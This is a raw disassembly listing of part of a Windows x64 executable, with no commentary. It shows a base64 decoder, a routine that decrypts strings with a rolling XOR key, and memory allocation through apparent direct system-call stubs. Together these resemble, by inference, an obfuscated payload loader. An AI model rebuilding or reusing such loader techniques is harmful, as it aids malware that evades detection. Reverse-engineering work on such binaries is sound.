   140002d3e:	48 b8 01 00 38 00 4b 	movabs $0x38004b00380001,%rax
   140002d45:	00 38 00 
   140002d48:	48 89 05 61 d6 2b 00 	mov    %rax,0x2bd661(%rip)        # 0x1402c03b0
   140002d4f:	66 c7 05 60 d6 2b 00 	movw   $0xd3,0x2bd660(%rip)        # 0x1402c03b8
   140002d56:	d3 00 
   140002d58:	48 8d 0d 41 00 00 00 	lea    0x41(%rip),%rcx        # 0x140002da0
   140002d5f:	e8 0c e6 ff ff       	call   0x140001370
   140002d64:	c6 05 13 d5 2b 00 01 	movb   $0x1,0x2bd513(%rip)        # 0x1402c027e
   140002d6b:	e9 aa f9 ff ff       	jmp    0x14000271a
   140002d70:	c6 05 57 d6 2b 00 01 	movb   $0x1,0x2bd657(%rip)        # 0x1402c03ce
   140002d77:	66 c7 05 4c d6 2b 00 	movw   $0xc7,0x2bd64c(%rip)        # 0x1402c03cc
   140002d7e:	c7 00 
   140002d80:	48 8d 0d 59 00 00 00 	lea    0x59(%rip),%rcx        # 0x140002de0
   140002d87:	e8 e4 e5 ff ff       	call   0x140001370
   140002d8c:	c6 05 ed d4 2b 00 01 	movb   $0x1,0x2bd4ed(%rip)        # 0x1402c0280
   140002d93:	e9 16 fc ff ff       	jmp    0x1400029ae
   140002d98:	cc                   	int3
   140002d99:	cc                   	int3
   140002d9a:	cc                   	int3
   140002d9b:	cc                   	int3
   140002d9c:	cc                   	int3
   140002d9d:	cc                   	int3
   140002d9e:	cc                   	int3
   140002d9f:	cc                   	int3
   140002da0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002da3:	0f 11 05 00 d6 2b 00 	movups %xmm0,0x2bd600(%rip)        # 0x1402c03aa
   140002daa:	0f 29 05 ef d5 2b 00 	movaps %xmm0,0x2bd5ef(%rip)        # 0x1402c03a0
   140002db1:	c3                   	ret
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	cc                   	int3
   140002db5:	cc                   	int3
   140002db6:	cc                   	int3
   140002db7:	cc                   	int3
   140002db8:	cc                   	int3
   140002db9:	cc                   	int3
   140002dba:	cc                   	int3
   140002dbb:	cc                   	int3
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	66 c7 05 ff d5 2b 00 	movw   $0x0,0x2bd5ff(%rip)        # 0x1402c03c8
   140002dc7:	00 00 
   140002dc9:	48 c7 05 ec d5 2b 00 	movq   $0x0,0x2bd5ec(%rip)        # 0x1402c03c0
   140002dd0:	00 00 00 00 
   140002dd4:	c3                   	ret
   140002dd5:	cc                   	int3
   140002dd6:	cc                   	int3
   140002dd7:	cc                   	int3
   140002dd8:	cc                   	int3
   140002dd9:	cc                   	int3
   140002dda:	cc                   	int3
   140002ddb:	cc                   	int3
   140002ddc:	cc                   	int3
   140002ddd:	cc                   	int3
   140002dde:	cc                   	int3
   140002ddf:	cc                   	int3
   140002de0:	66 c7 05 e3 d5 2b 00 	movw   $0x0,0x2bd5e3(%rip)        # 0x1402c03cc
   140002de7:	00 00 
   140002de9:	c3                   	ret
   140002dea:	cc                   	int3
   140002deb:	cc                   	int3
   140002dec:	cc                   	int3
   140002ded:	cc                   	int3
   140002dee:	cc                   	int3
   140002def:	cc                   	int3
   140002df0:	41 56                	push   %r14
   140002df2:	56                   	push   %rsi
   140002df3:	57                   	push   %rdi
   140002df4:	55                   	push   %rbp
   140002df5:	53                   	push   %rbx
   140002df6:	b8 60 00 01 00       	mov    $0x10060,%eax
   140002dfb:	e8 60 f8 ff ff       	call   0x140002660
   140002e00:	48 29 c4             	sub    %rax,%rsp
   140002e03:	4d 89 ce             	mov    %r9,%r14
   140002e06:	4c 89 c7             	mov    %r8,%rdi
   140002e09:	48 89 d6             	mov    %rdx,%rsi
   140002e0c:	89 cb                	mov    %ecx,%ebx
   140002e0e:	31 ed                	xor    %ebp,%ebp
   140002e10:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002e15:	41 b8 fe ff 00 00    	mov    $0xfffe,%r8d
   140002e1b:	31 d2                	xor    %edx,%edx
   140002e1d:	e8 be 78 00 00       	call   0x14000a6e0
   140002e22:	48 8d 84 24 b0 00 01 	lea    0x100b0(%rsp),%rax
   140002e29:	00 
   140002e2a:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002e2f:	41 0f b7 0e          	movzwl (%r14),%ecx
   140002e33:	66 85 c9             	test   %cx,%cx
   140002e36:	0f 84 bf 00 00 00    	je     0x140002efb
   140002e3c:	31 ed                	xor    %ebp,%ebp
   140002e3e:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140002e43:	eb 2e                	jmp    0x140002e73
   140002e45:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002e4c:	00 00 00 00 
   140002e50:	ff c5                	inc    %ebp
   140002e52:	66 89 4c 54 60       	mov    %cx,0x60(%rsp,%rdx,2)
   140002e57:	31 d2                	xor    %edx,%edx
   140002e59:	66 41 83 3e 00       	cmpw   $0x0,(%r14)
   140002e5e:	0f 95 c2             	setne  %dl
   140002e61:	41 0f b7 0c 56       	movzwl (%r14,%rdx,2),%ecx
   140002e66:	4d 8d 34 56          	lea    (%r14,%rdx,2),%r14
   140002e6a:	66 85 c9             	test   %cx,%cx
   140002e6d:	0f 84 88 00 00 00    	je     0x140002efb
   140002e73:	81 fd fd 7f 00 00    	cmp    $0x7ffd,%ebp
   140002e79:	0f 87 7c 00 00 00    	ja     0x140002efb
   140002e7f:	48 63 d5             	movslq %ebp,%rdx
   140002e82:	66 83 f9 25          	cmp    $0x25,%cx
   140002e86:	75 c8                	jne    0x140002e50
   140002e88:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140002e8c:	66 41 83 7e 02 53    	cmpw   $0x53,0x2(%r14)
   140002e92:	75 51                	jne    0x140002ee5
   140002e94:	4c 8d 40 08          	lea    0x8(%rax),%r8
   140002e98:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140002e9d:	48 8b 00             	mov    (%rax),%rax
   140002ea0:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ea4:	66 45 85 d2          	test   %r10w,%r10w
   140002ea8:	74 38                	je     0x140002ee2
   140002eaa:	48 81 fa ff 7f 00 00 	cmp    $0x7fff,%rdx
   140002eb1:	41 b9 fe 7f 00 00    	mov    $0x7ffe,%r9d
   140002eb7:	4c 0f 43 ca          	cmovae %rdx,%r9
   140002ebb:	48 83 c0 02          	add    $0x2,%rax
   140002ebf:	90                   	nop
   140002ec0:	48 81 fa fd 7f 00 00 	cmp    $0x7ffd,%rdx
   140002ec7:	77 24                	ja     0x140002eed
   140002ec9:	ff c5                	inc    %ebp
   140002ecb:	66 44 89 54 54 60    	mov    %r10w,0x60(%rsp,%rdx,2)
   140002ed1:	48 ff c2             	inc    %rdx
   140002ed4:	44 0f b7 10          	movzwl (%rax),%r10d
   140002ed8:	48 83 c0 02          	add    $0x2,%rax
   140002edc:	66 45 85 d2          	test   %r10w,%r10w
   140002ee0:	75 de                	jne    0x140002ec0
   140002ee2:	4c 89 c0             	mov    %r8,%rax
   140002ee5:	49 89 ce             	mov    %rcx,%r14
   140002ee8:	e9 6a ff ff ff       	jmp    0x140002e57
   140002eed:	4c 89 c0             	mov    %r8,%rax
   140002ef0:	44 89 cd             	mov    %r9d,%ebp
   140002ef3:	49 89 ce             	mov    %rcx,%r14
   140002ef6:	e9 5c ff ff ff       	jmp    0x140002e57
   140002efb:	48 63 c5             	movslq %ebp,%rax
   140002efe:	66 c7 44 44 60 00 00 	movw   $0x0,0x60(%rsp,%rax,2)
   140002f05:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002f0c:	00 
   140002f0d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002f14:	00 00 
   140002f16:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140002f1b:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140002f20:	48 89 fa             	mov    %rdi,%rdx
   140002f23:	49 89 f1             	mov    %rsi,%r9
   140002f26:	e8 65 f7 ff ff       	call   0x140002690
   140002f2b:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002f30:	e8 29 e5 ff ff       	call   0x14000145e
   140002f35:	84 db                	test   %bl,%bl
   140002f37:	74 1a                	je     0x140002f53
   140002f39:	48 c7 44 24 40 00 5d 	movq   $0xffffffffee1e5d00,0x40(%rsp)
   140002f40:	1e ee 
   140002f42:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f47:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002f4c:	31 d2                	xor    %edx,%edx
   140002f4e:	e8 bf e5 ff ff       	call   0x140001512
   140002f53:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f58:	e8 01 e5 ff ff       	call   0x14000145e
   140002f5d:	90                   	nop
   140002f5e:	48 81 c4 60 00 01 00 	add    $0x10060,%rsp
   140002f65:	5b                   	pop    %rbx
   140002f66:	5d                   	pop    %rbp
   140002f67:	5f                   	pop    %rdi
   140002f68:	5e                   	pop    %rsi
   140002f69:	41 5e                	pop    %r14
   140002f6b:	c3                   	ret
   140002f6c:	cc                   	int3
   140002f6d:	cc                   	int3
   140002f6e:	cc                   	int3
   140002f6f:	cc                   	int3
   140002f70:	41 56                	push   %r14
   140002f72:	56                   	push   %rsi
   140002f73:	57                   	push   %rdi
   140002f74:	55                   	push   %rbp
   140002f75:	53                   	push   %rbx
   140002f76:	48 83 ec 40          	sub    $0x40,%rsp
   140002f7a:	4c 89 c6             	mov    %r8,%rsi
   140002f7d:	48 89 d7             	mov    %rdx,%rdi
   140002f80:	48 89 cb             	mov    %rcx,%rbx
   140002f83:	e8 58 02 00 00       	call   0x1400031e0
   140002f88:	48 89 f8             	mov    %rdi,%rax
   140002f8b:	48 c1 e8 02          	shr    $0x2,%rax
   140002f8f:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140002f93:	48 89 06             	mov    %rax,(%rsi)
   140002f96:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002f9b:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002fa2:	00 00 
   140002fa4:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140002fab:	00 
   140002fac:	c7 44 24 20 00 10 00 	movl   $0x1000,0x20(%rsp)
   140002fb3:	00 
   140002fb4:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140002fb9:	45 31 f6             	xor    %r14d,%r14d
   140002fbc:	4c 8d 4c 24 38       	lea    0x38(%rsp),%r9
   140002fc1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002fc8:	45 31 c0             	xor    %r8d,%r8d
   140002fcb:	e8 d9 e4 ff ff       	call   0x1400014a9
   140002fd0:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   140002fd5:	41 b9 3e 00 00 00    	mov    $0x3e,%r9d
   140002fdb:	31 c9                	xor    %ecx,%ecx
   140002fdd:	eb 11                	jmp    0x140002ff0
   140002fdf:	90                   	nop
   140002fe0:	49 83 c6 04          	add    $0x4,%r14
   140002fe4:	48 89 d1             	mov    %rdx,%rcx
   140002fe7:	49 39 fe             	cmp    %rdi,%r14
   140002fea:	0f 83 d1 01 00 00    	jae    0x1400031c1
   140002ff0:	42 0f b6 04 33       	movzbl (%rbx,%r14,1),%eax
   140002ff5:	8d 50 a5             	lea    -0x5b(%rax),%edx
   140002ff8:	80 fa e6             	cmp    $0xe6,%dl
   140002ffb:	73 33                	jae    0x140003030
   140002ffd:	8d 50 85             	lea    -0x7b(%rax),%edx
   140003000:	80 fa e6             	cmp    $0xe6,%dl
   140003003:	73 3b                	jae    0x140003040
   140003005:	8d 50 c6             	lea    -0x3a(%rax),%edx
   140003008:	80 fa f6             	cmp    $0xf6,%dl
   14000300b:	73 38                	jae    0x140003045
   14000300d:	ba 3f 00 00 00       	mov    $0x3f,%edx
   140003012:	83 f8 2f             	cmp    $0x2f,%eax
   140003015:	74 02                	je     0x140003019
   140003017:	31 d2                	xor    %edx,%edx
   140003019:	83 f8 2b             	cmp    $0x2b,%eax
   14000301c:	41 0f 44 d1          	cmove  %r9d,%edx
   140003020:	eb 30                	jmp    0x140003052
   140003022:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003029:	1f 84 00 00 00 00 00 
   140003030:	83 c0 bf             	add    $0xffffffbf,%eax
   140003033:	eb 1b                	jmp    0x140003050
   140003035:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000303c:	00 00 00 00 
   140003040:	83 c0 b9             	add    $0xffffffb9,%eax
   140003043:	eb 0b                	jmp    0x140003050
   140003045:	83 c0 04             	add    $0x4,%eax
   140003048:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000304f:	00 
   140003050:	89 c2                	mov    %eax,%edx
   140003052:	42 0f b6 44 33 01    	movzbl 0x1(%rbx,%r14,1),%eax
   140003058:	44 8d 40 a5          	lea    -0x5b(%rax),%r8d
   14000305c:	41 80 f8 e6          	cmp    $0xe6,%r8b
   140003060:	73 2e                	jae    0x140003090
   140003062:	44 8d 40 85          	lea    -0x7b(%rax),%r8d
   140003066:	41 80 f8 e6          	cmp    $0xe6,%r8b
   14000306a:	73 34                	jae    0x1400030a0
   14000306c:	44 8d 40 c6          	lea    -0x3a(%rax),%r8d
   140003070:	41 80 f8 f6          	cmp    $0xf6,%r8b
   140003074:	73 2f                	jae    0x1400030a5
   140003076:	41 b8 3f 00 00 00    	mov    $0x3f,%r8d
   14000307c:	83 f8 2f             	cmp    $0x2f,%eax
   14000307f:	74 03                	je     0x140003084
   140003081:	45 31 c0             	xor    %r8d,%r8d
   140003084:	83 f8 2b             	cmp    $0x2b,%eax
   140003087:	45 0f 44 c1          	cmove  %r9d,%r8d
   14000308b:	eb 26                	jmp    0x1400030b3
   14000308d:	0f 1f 00             	nopl   (%rax)
   140003090:	83 c0 bf             	add    $0xffffffbf,%eax
   140003093:	eb 1b                	jmp    0x1400030b0
   140003095:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000309c:	00 00 00 00 
   1400030a0:	83 c0 b9             	add    $0xffffffb9,%eax
   1400030a3:	eb 0b                	jmp    0x1400030b0
   1400030a5:	83 c0 04             	add    $0x4,%eax
   1400030a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030af:	00 
   1400030b0:	41 89 c0             	mov    %eax,%r8d
   1400030b3:	46 0f b6 54 33 02    	movzbl 0x2(%rbx,%r14,1),%r10d
   1400030b9:	41 8d 42 a5          	lea    -0x5b(%r10),%eax
   1400030bd:	3c e6                	cmp    $0xe6,%al
   1400030bf:	73 2f                	jae    0x1400030f0
   1400030c1:	41 8d 42 85          	lea    -0x7b(%r10),%eax
   1400030c5:	3c e6                	cmp    $0xe6,%al
   1400030c7:	73 37                	jae    0x140003100
   1400030c9:	41 8d 42 c6          	lea    -0x3a(%r10),%eax
   1400030cd:	3c f6                	cmp    $0xf6,%al
   1400030cf:	73 35                	jae    0x140003106
   1400030d1:	b8 3f 00 00 00       	mov    $0x3f,%eax
   1400030d6:	41 83 fa 2f          	cmp    $0x2f,%r10d
   1400030da:	74 02                	je     0x1400030de
   1400030dc:	31 c0                	xor    %eax,%eax
   1400030de:	41 83 fa 2b          	cmp    $0x2b,%r10d
   1400030e2:	41 0f 44 c1          	cmove  %r9d,%eax
   1400030e6:	eb 2b                	jmp    0x140003113
   1400030e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400030ef:	00 
   1400030f0:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   1400030f4:	eb 1a                	jmp    0x140003110
   1400030f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400030fd:	00 00 00 
   140003100:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003104:	eb 0a                	jmp    0x140003110
   140003106:	41 83 c2 04          	add    $0x4,%r10d
   14000310a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003110:	44 89 d0             	mov    %r10d,%eax
   140003113:	46 0f b6 54 33 03    	movzbl 0x3(%rbx,%r14,1),%r10d
   140003119:	45 8d 5a a5          	lea    -0x5b(%r10),%r11d
   14000311d:	41 80 fb e6          	cmp    $0xe6,%r11b
   140003121:	73 2d                	jae    0x140003150
   140003123:	45 8d 5a 85          	lea    -0x7b(%r10),%r11d
   140003127:	41 80 fb e6          	cmp    $0xe6,%r11b
   14000312b:	73 33                	jae    0x140003160
   14000312d:	45 8d 5a c6          	lea    -0x3a(%r10),%r11d
   140003131:	41 80 fb f6          	cmp    $0xf6,%r11b
   140003135:	73 2f                	jae    0x140003166
   140003137:	41 bb 3f 00 00 00    	mov    $0x3f,%r11d
   14000313d:	41 83 fa 2f          	cmp    $0x2f,%r10d
   140003141:	74 03                	je     0x140003146
   140003143:	45 31 db             	xor    %r11d,%r11d
   140003146:	41 83 fa 2b          	cmp    $0x2b,%r10d
   14000314a:	45 0f 44 d9          	cmove  %r9d,%r11d
   14000314e:	eb 23                	jmp    0x140003173
   140003150:	41 83 c2 bf          	add    $0xffffffbf,%r10d
   140003154:	eb 1a                	jmp    0x140003170
   140003156:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000315d:	00 00 00 
   140003160:	41 83 c2 b9          	add    $0xffffffb9,%r10d
   140003164:	eb 0a                	jmp    0x140003170
   140003166:	41 83 c2 04          	add    $0x4,%r10d
   14000316a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003170:	45 89 d3             	mov    %r10d,%r11d
   140003173:	c1 e2 12             	shl    $0x12,%edx
   140003176:	41 c1 e0 0c          	shl    $0xc,%r8d
   14000317a:	41 09 d0             	or     %edx,%r8d
   14000317d:	c1 e0 06             	shl    $0x6,%eax
   140003180:	44 09 d8             	or     %r11d,%eax
   140003183:	44 09 c0             	or     %r8d,%eax
   140003186:	41 89 c0             	mov    %eax,%r8d
   140003189:	41 c1 e8 10          	shr    $0x10,%r8d
   14000318d:	48 8d 51 01          	lea    0x1(%rcx),%rdx
   140003191:	44 88 44 0d 00       	mov    %r8b,0x0(%rbp,%rcx,1)
   140003196:	4c 8b 06             	mov    (%rsi),%r8
   140003199:	4c 39 c2             	cmp    %r8,%rdx
   14000319c:	73 0e                	jae    0x1400031ac
   14000319e:	88 64 0d 01          	mov    %ah,0x1(%rbp,%rcx,1)
   1400031a2:	48 83 c1 02          	add    $0x2,%rcx
   1400031a6:	4c 8b 06             	mov    (%rsi),%r8
   1400031a9:	48 89 ca             	mov    %rcx,%rdx
   1400031ac:	4c 39 c2             	cmp    %r8,%rdx
   1400031af:	0f 83 2b fe ff ff    	jae    0x140002fe0
   1400031b5:	88 44 15 00          	mov    %al,0x0(%rbp,%rdx,1)
   1400031b9:	48 ff c2             	inc    %rdx
   1400031bc:	e9 1f fe ff ff       	jmp    0x140002fe0
   1400031c1:	48 8b 16             	mov    (%rsi),%rdx
   1400031c4:	48 89 e9             	mov    %rbp,%rcx
   1400031c7:	e8 14 00 00 00       	call   0x1400031e0
   1400031cc:	48 89 e8             	mov    %rbp,%rax
   1400031cf:	48 83 c4 40          	add    $0x40,%rsp
   1400031d3:	5b                   	pop    %rbx
   1400031d4:	5d                   	pop    %rbp
   1400031d5:	5f                   	pop    %rdi
   1400031d6:	5e                   	pop    %rsi
   1400031d7:	41 5e                	pop    %r14
   1400031d9:	c3                   	ret
   1400031da:	cc                   	int3
   1400031db:	cc                   	int3
   1400031dc:	cc                   	int3
   1400031dd:	cc                   	int3
   1400031de:	cc                   	int3
   1400031df:	cc                   	int3
   1400031e0:	56                   	push   %rsi
   1400031e1:	57                   	push   %rdi
   1400031e2:	53                   	push   %rbx
   1400031e3:	48 83 ec 20          	sub    $0x20,%rsp
   1400031e7:	48 85 d2             	test   %rdx,%rdx
   1400031ea:	74 67                	je     0x140003253
   1400031ec:	48 89 d6             	mov    %rdx,%rsi
   1400031ef:	48 89 cf             	mov    %rcx,%rdi
   1400031f2:	0f b6 19             	movzbl (%rcx),%ebx
   1400031f5:	80 3d b8 d0 2b 00 00 	cmpb   $0x0,0x2bd0b8(%rip)        # 0x1402c02b4
   1400031fc:	0f 84 dc 00 00 00    	je     0x1400032de
   140003202:	80 3d 58 eb 2b 00 00 	cmpb   $0x0,0x2beb58(%rip)        # 0x1402c1d61
   140003209:	74 3a                	je     0x140003245
   14000320b:	66 0f 6f 05 bd 83 00 	movdqa 0x83bd(%rip),%xmm0        # 0x14000b5d0
   140003212:	00 
   140003213:	66 0f 6f 0d 25 eb 2b 	movdqa 0x2beb25(%rip),%xmm1        # 0x1402c1d40
   14000321a:	00 
   14000321b:	66 0f fc c8          	paddb  %xmm0,%xmm1
   14000321f:	66 0f 7f 0d 19 eb 2b 	movdqa %xmm1,0x2beb19(%rip)        # 0x1402c1d40
   140003226:	00 
   140003227:	66 0f fc 05 21 eb 2b 	paddb  0x2beb21(%rip),%xmm0        # 0x1402c1d50
   14000322e:	00 
   14000322f:	66 0f 7f 05 19 eb 2b 	movdqa %xmm0,0x2beb19(%rip)        # 0x1402c1d50
   140003236:	00 
   140003237:	80 05 22 eb 2b 00 e7 	addb   $0xe7,0x2beb22(%rip)        # 0x1402c1d60
   14000323e:	c6 05 1c eb 2b 00 00 	movb   $0x0,0x2beb1c(%rip)        # 0x1402c1d61
   140003245:	32 1d f5 ea 2b 00    	xor    0x2beaf5(%rip),%bl        # 0x1402c1d40
   14000324b:	88 1f                	mov    %bl,(%rdi)
   14000324d:	48 83 fe 01          	cmp    $0x1,%rsi
   140003251:	75 08                	jne    0x14000325b
   140003253:	48 83 c4 20          	add    $0x20,%rsp
   140003257:	5b                   	pop    %rbx
   140003258:	5f                   	pop    %rdi
   140003259:	5e                   	pop    %rsi
   14000325a:	c3                   	ret
   14000325b:	44 0f b6 05 fe ea 2b 	movzbl 0x2beafe(%rip),%r8d        # 0x1402c1d61
   140003262:	00 
   140003263:	66 0f 6f 05 d5 ea 2b 	movdqa 0x2bead5(%rip),%xmm0        # 0x1402c1d40
   14000326a:	00 
   14000326b:	66 0f 6f 0d dd ea 2b 	movdqa 0x2beadd(%rip),%xmm1        # 0x1402c1d50
   140003272:	00 
   140003273:	b8 01 00 00 00       	mov    $0x1,%eax
   140003278:	0f b6 0d e1 ea 2b 00 	movzbl 0x2beae1(%rip),%ecx        # 0x1402c1d60
   14000327f:	48 8d 15 ba ea 2b 00 	lea    0x2beaba(%rip),%rdx        # 0x1402c1d40
   140003286:	66 0f 6f 15 42 83 00 	movdqa 0x8342(%rip),%xmm2        # 0x14000b5d0
   14000328d:	00 
   14000328e:	eb 17                	jmp    0x1400032a7
   140003290:	41 89 c2             	mov    %eax,%r10d
   140003293:	41 83 e2 1f          	and    $0x1f,%r10d
   140003297:	45 32 0c 12          	xor    (%r10,%rdx,1),%r9b
   14000329b:	44 88 0c 07          	mov    %r9b,(%rdi,%rax,1)
   14000329f:	48 ff c0             	inc    %rax
   1400032a2:	48 39 c6             	cmp    %rax,%rsi
   1400032a5:	74 ac                	je     0x140003253
   1400032a7:	44 0f b6 0c 07       	movzbl (%rdi,%rax,1),%r9d
   1400032ac:	45 84 c0             	test   %r8b,%r8b
   1400032af:	74 df                	je     0x140003290
   1400032b1:	66 0f fc c2          	paddb  %xmm2,%xmm0
   1400032b5:	66 0f 7f 05 83 ea 2b 	movdqa %xmm0,0x2bea83(%rip)        # 0x1402c1d40
   1400032bc:	00 
   1400032bd:	66 0f fc ca          	paddb  %xmm2,%xmm1
   1400032c1:	66 0f 7f 0d 87 ea 2b 	movdqa %xmm1,0x2bea87(%rip)        # 0x1402c1d50
   1400032c8:	00 
   1400032c9:	80 c1 e7             	add    $0xe7,%cl
   1400032cc:	88 0d 8e ea 2b 00    	mov    %cl,0x2bea8e(%rip)        # 0x1402c1d60
   1400032d2:	c6 05 88 ea 2b 00 00 	movb   $0x0,0x2bea88(%rip)        # 0x1402c1d61
   1400032d9:	45 31 c0             	xor    %r8d,%r8d
   1400032dc:	eb b2                	jmp    0x140003290
   1400032de:	0f 28 05 cb 82 00 00 	movaps 0x82cb(%rip),%xmm0        # 0x14000b5b0
   1400032e5:	0f 29 05 54 ea 2b 00 	movaps %xmm0,0x2bea54(%rip)        # 0x1402c1d40
   1400032ec:	66 0f 6f 05 cc 82 00 	movdqa 0x82cc(%rip),%xmm0        # 0x14000b5c0
   1400032f3:	00 
   1400032f4:	66 0f 7f 05 54 ea 2b 	movdqa %xmm0,0x2bea54(%rip)        # 0x1402c1d50
   1400032fb:	00 
   1400032fc:	66 c7 05 5b ea 2b 00 	movw   $0x119,0x2bea5b(%rip)        # 0x1402c1d60
   140003303:	19 01 
   140003305:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x140003330
   14000330c:	e8 5f e0 ff ff       	call   0x140001370
   140003311:	c6 05 9c cf 2b 00 01 	movb   $0x1,0x2bcf9c(%rip)        # 0x1402c02b4
   140003318:	80 3d 42 ea 2b 00 00 	cmpb   $0x0,0x2bea42(%rip)        # 0x1402c1d61
   14000331f:	0f 85 e6 fe ff ff    	jne    0x14000320b
   140003325:	e9 1b ff ff ff       	jmp    0x140003245
   14000332a:	cc                   	int3
   14000332b:	cc                   	int3
   14000332c:	cc                   	int3
   14000332d:	cc                   	int3
   14000332e:	cc                   	int3
   14000332f:	cc                   	int3
   140003330:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003333:	0f 29 05 16 ea 2b 00 	movaps %xmm0,0x2bea16(%rip)        # 0x1402c1d50
   14000333a:	0f 29 05 ff e9 2b 00 	movaps %xmm0,0x2be9ff(%rip)        # 0x1402c1d40
   140003341:	c6 05 18 ea 2b 00 00 	movb   $0x0,0x2bea18(%rip)        # 0x1402c1d60
   140003348:	c3                   	ret
   140003349:	cc                   	int3
   14000334a:	cc                   	int3
   14000334b:	cc                   	int3
   14000334c:	cc                   	int3
   14000334d:	cc                   	int3
   14000334e:	cc                   	int3
   14000334f:	cc                   	int3
   140003350:	41 57                	push   %r15
   140003352:	41 56                	push   %r14
   140003354:	41 55                	push   %r13
   140003356:	41 54                	push   %r12
   140003358:	56                   	push   %rsi
   140003359:	57                   	push   %rdi
   14000335a:	55                   	push   %rbp
   14000335b:	53                   	push   %rbx
   14000335c:	48 81 ec 28 05 00 00 	sub    $0x528,%rsp
   140003363:	66 44 0f 7f 84 24 10 	movdqa %xmm8,0x510(%rsp)
   14000336a:	05 00 00 
   14000336d:	66 0f 7f bc 24 00 05 	movdqa %xmm7,0x500(%rsp)
   140003374:	00 00 
   140003376:	0f 29 b4 24 f0 04 00 	movaps %xmm6,0x4f0(%rsp)
   14000337d:	00 
   14000337e:	44 89 44 24 74       	mov    %r8d,0x74(%rsp)
   140003383:	48 89 94 24 c8 00 00 	mov    %rdx,0xc8(%rsp)
   14000338a:	00 
   14000338b:	48 89 cb             	mov    %rcx,%rbx
   14000338e:	48 c7 44 24 78 00 00 	movq   $0x0,0x78(%rsp)
   140003395:	00 00 
   140003397:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000339a:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400033a1:	00 
   1400033a2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400033a9:	00 
   1400033aa:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400033b0:	31 d2                	xor    %edx,%edx
   1400033b2:	e8 29 73 00 00       	call   0x14000a6e0
   1400033b7:	0f b7 03             	movzwl (%rbx),%eax
   1400033ba:	66 85 c0             	test   %ax,%ax
   1400033bd:	0f 84 fe 01 00 00    	je     0x1400035c1
   1400033c3:	4c 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%r14
   1400033ca:	00 
   1400033cb:	4c 8d a4 24 d0 00 00 	lea    0xd0(%rsp),%r12
   1400033d2:	00 
   1400033d3:	48 8d 7c 24 60       	lea    0x60(%rsp),%rdi
   1400033d8:	4c 8d 6c 24 78       	lea    0x78(%rsp),%r13
   1400033dd:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   1400033e4:	00 
   1400033e5:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   1400033ec:	00 
   1400033ed:	66 0f 6f 3d eb 81 00 	movdqa 0x81eb(%rip),%xmm7        # 0x14000b5e0
   1400033f4:	00 
   1400033f5:	66 44 0f 6f 05 f2 81 	movdqa 0x81f2(%rip),%xmm8        # 0x14000b5f0
   1400033fc:	00 00 
   1400033fe:	45 31 ff             	xor    %r15d,%r15d
   140003401:	eb 20                	jmp    0x140003423
   140003403:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000340a:	84 00 00 00 00 00 
   140003410:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003416:	49 83 c7 02          	add    $0x2,%r15
   14000341a:	66 85 c0             	test   %ax,%ax
   14000341d:	0f 84 9e 01 00 00    	je     0x1400035c1
   140003423:	66 42 89 84 3c d0 00 	mov    %ax,0xd0(%rsp,%r15,1)
   14000342a:	00 00 
   14000342c:	66 83 f8 2f          	cmp    $0x2f,%ax
   140003430:	74 08                	je     0x14000343a
   140003432:	0f b7 c0             	movzwl %ax,%eax
   140003435:	83 f8 5c             	cmp    $0x5c,%eax
   140003438:	75 d6                	jne    0x140003410
   14000343a:	41 b8 10 02 00 00    	mov    $0x210,%r8d
